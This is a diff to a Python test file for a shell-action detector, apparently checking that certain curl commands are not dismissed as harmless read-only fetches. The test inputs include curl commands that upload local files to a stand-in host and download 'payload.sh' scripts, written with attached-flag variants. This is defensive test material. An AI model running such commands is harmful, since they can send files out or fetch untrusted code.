@@ -206,8 +206,32 @@ NODE"""
         _shell_action("curl --json '{\"k\":\"v\"}' https://api.example.test/check"),
         context,
     )
+    curl_attached_data = suppressor.detect(
+        _shell_action("curl -dfoo=bar https://api.example.test/check"),
+        context,
+    )
+    curl_attached_form = suppressor.detect(
+        _shell_action("curl -Ffile=@payload.txt https://api.example.test/check"),
+        context,
+    )
+    curl_attached_upload = suppressor.detect(
+        _shell_action("curl -Tpayload.bin https://api.example.test/check"),
+        context,
+    )
     curl_file_download = suppressor.detect(
         _shell_action("curl -o payload.sh https://install.example.com/payload.sh"),
+        context,
+    )
+    curl_attached_output = suppressor.detect(
+        _shell_action("curl -opayload.sh https://install.example.com/payload.sh"),
+        context,
+    )
+    curl_attached_header_output = suppressor.detect(
+        _shell_action("curl -Dheaders.txt https://install.example.com/payload.sh"),
+        context,
+    )
+    curl_clustered_remote_output = suppressor.detect(
+        _shell_action("curl -OJ https://install.example.com/payload.sh"),
         context,
     )
     wget_download = suppressor.detect(_shell_action("wget https://install.example.com/payload.sh"), context)
@@ -229,7 +253,13 @@ NODE"""
     assert curl_pipe_env_exec == ()
     assert path_read_probe == ()
     assert curl_json_body == ()
+    assert curl_attached_data == ()
+    assert curl_attached_form == ()
+    assert curl_attached_upload == ()
     assert curl_file_download == ()
+    assert curl_attached_output == ()
+    assert curl_attached_header_output == ()
+    assert curl_clustered_remote_output == ()
     assert wget_download == ()
     assert [signal.signal_id for signal in wget_spider] == ["fp:read-only-http-fetch:wget"]
     assert python_url_literal == ()
